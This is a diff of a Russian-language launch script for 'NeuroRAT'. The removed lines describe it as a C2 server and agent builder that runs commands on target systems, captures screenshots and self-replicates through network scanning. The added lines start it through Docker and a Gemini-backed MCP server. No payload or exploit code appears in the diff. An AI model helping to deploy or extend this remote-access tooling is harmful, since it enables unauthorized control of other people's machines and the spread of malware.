@@ -4,76 +4,76 @@
 # Определение цветов для вывода
 RED='\033[0;31m'
 GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
+YELLOW='\033[0;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
 
-echo -e "${GREEN}"
-echo "  _   _                      ____      _  _____ "
-echo " | \ | | ___ _   _ _ __ ___ |  _ \    / \|_   _|"
-echo " |  \| |/ _ \ | | | '__/ _ \| |_) |  / _ \ | |  "
-echo " | |\  |  __/ |_| | | | (_) |  _ <  / ___ \| |  "
-echo " |_| \_|\___|\__,_|_|  \___/|_| \_\/_/   \_\_|  "
-echo -e "${NC}"
-echo -e "${YELLOW}C2 Server и Билдер${NC}"
-echo ""
+echo -e "${BLUE}====== Запуск NeuroRAT с MCP и Gemini ======${NC}"
 
-# Проверка зависимостей
-echo -e "${BLUE}[*] Проверка зависимостей...${NC}"
+# Загрузка .env файла, если он существует
+if [ -f .env ]; then
+    echo -e "${GREEN}Найден .env файл, загружаем настройки...${NC}"
+    source .env
+fi
 
-check_dependency() {
-    if ! command -v $1 &> /dev/null; then
-        echo -e "${RED}[-] $2 не найден. Установите $2 для продолжения.${NC}"
-        exit 1
-    else
-        echo -e "${GREEN}[+] $2 найден.${NC}"
-    fi
-}
-
-check_dependency python3 "Python 3"
-check_dependency pip3 "pip3"
-
-# Установка Python зависимостей
-echo -e "${BLUE}[*] Установка Python зависимостей...${NC}"
-pip3 install fastapi uvicorn jinja2 python-multipart pillow psutil
-
-# Выбор режима запуска
-echo ""
-echo -e "${YELLOW}Выберите режим запуска:${NC}"
-echo "1) Запуск C2 сервера (стандартный режим)"
-echo "2) Только сборка агентов (билдер)"
-echo "3) Помощь и информация"
-
-read -p "Выберите опцию (1-3): " choice
-
-case $choice in
-  1)
-    echo -e "${GREEN}[+] Запуск C2 сервера...${NC}"
-    echo -e "${BLUE}[*] Сервер будет доступен по адресу http://localhost:8088${NC}"
-    echo -e "${BLUE}[*] Логин: admin / Пароль: neurorat${NC}"
-    python3 server_api.py
-    ;;
-  2)
-    echo -e "${GREEN}[+] Запуск билдера агентов...${NC}"
-    echo -e "${BLUE}[*] Выполняется настройка...${NC}"
-    # Запуск билдера в режиме без сервера
-    python3 server_api.py --builder-only
-    ;;
-  3)
-    echo -e "${BLUE}=== NeuroRAT C2 Server ====${NC}"
-    echo "Система управления и мониторинга конечных точек."
-    echo ""
-    echo "Возможности сервера:"
-    echo "- Мониторинг подключенных агентов"
-    echo "- Выполнение команд на целевых системах"
-    echo "- Сбор информации и захват скриншотов"
-    echo "- Создание кастомизированных агентов"
-    echo "- Саморепликация через сетевое сканирование"
-    echo ""
-    echo "Документация доступна в файле README.md"
-    ;;
-  *)
-    echo -e "${RED}[-] Неверный выбор. Выход.${NC}"
+# Проверка наличия Docker
+if ! command -v docker &> /dev/null; then
+    echo -e "${RED}Docker не установлен!${NC}"
+    echo "Пожалуйста, установите Docker: https://docs.docker.com/get-docker/"
     exit 1
-    ;;
-esac 
+fi
+
+# Проверка наличия docker-compose
+if ! command -v docker-compose &> /dev/null; then
+    echo -e "${RED}Docker Compose не установлен!${NC}"
+    echo "Пожалуйста, установите Docker Compose: https://docs.docker.com/compose/install/"
+    exit 1
+fi
+
+# Проверка наличия Python
+if ! command -v python3 &> /dev/null; then
+    echo -e "${RED}Python 3 не установлен!${NC}"
+    echo "Пожалуйста, установите Python 3"
+    exit 1
+fi
+
+echo -e "${YELLOW}Проверка зависимостей...${NC}"
+pip install -q google-generativeai uvicorn fastapi pydantic python-dotenv
+
+# Останавливаем предыдущие Docker контейнеры
+echo -e "${YELLOW}Останавливаем предыдущие контейнеры...${NC}"
+docker-compose down
+
+# Запускаем контейнеры
+echo -e "${YELLOW}Запускаем Docker контейнеры...${NC}"
+docker-compose up --build -d
+
+# Проверяем, успешно ли запустились контейнеры
+if [ $? -eq 0 ]; then
+    echo -e "${GREEN}Docker контейнеры успешно запущены!${NC}"
+else
+    echo -e "${RED}Ошибка при запуске Docker контейнеров!${NC}"
+    exit 1
+fi
+
+# Проверяем наличие ключа API для Gemini
+if [ -z "$GEMINI_API_KEY" ]; then
+    echo -e "${YELLOW}API ключ для Gemini не найден в .env. Пожалуйста, введите ключ (или оставьте пустым для пропуска):${NC}"
+    read gemini_key
+else
+    echo -e "${GREEN}Используем API ключ Gemini из .env файла${NC}"
+    gemini_key=$GEMINI_API_KEY
+fi
+
+# Запускаем MCP сервер
+echo -e "${YELLOW}Запускаем MCP сервер...${NC}"
+if [ -z "$gemini_key" ]; then
+    # Без API ключа
+    python3 start_mcp.py --skip-docker --host 0.0.0.0 --port 8089
+else
+    # С API ключом
+    python3 start_mcp.py --skip-docker --host 0.0.0.0 --port 8089 --gemini-key "$gemini_key"
+fi
+
+echo -e "${BLUE}====== Завершение работы ======${NC}"
+exit 0 
